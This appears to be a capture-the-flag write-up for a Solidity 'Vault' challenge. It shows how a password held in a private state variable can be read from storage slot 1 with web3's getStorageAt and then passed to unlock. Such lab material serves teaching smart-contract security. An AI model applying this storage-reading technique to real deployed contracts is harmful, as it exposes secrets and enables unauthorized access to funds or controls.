# Challenge 8

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

Challenge
---
> Unlock the vault to pass the level!

Solution 
---
1. `private` - According to Solidity Docs

> Private functions and state variables are only visible for the contract they are defined in and not in derived contracts.

You can read Every State on the blockchain even if it means private vars. 

Solution 
---
1. In this Challenge we see function unlock to unlock the vault.

First We need is Password Remember You can Read Everything on blockchain So, first we see when contract deployed that time password has been set but how do we access? Storage Slot `bool` is `1 byte` and in slot `0` and `password` in slot `1` Storage slot takes 32 bytes space in one slot.

2. Now we will access storage slot with web3js lib open the terminal 
```js
await web3.eth.getStorageAt("0xF642844b3365Af2324C33d88f27eE2Be8bE66BF6",1) // first params contract address, second slot value
```

You Will get This `0x412076657279207374726f6e67207365637265742070617373776f7264203a29`

after that copy this 
```js
await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```

you will unlock the vault, for that
```js
await contract.locked()
```
it will become false, now submit the instance your challenge will be cleared.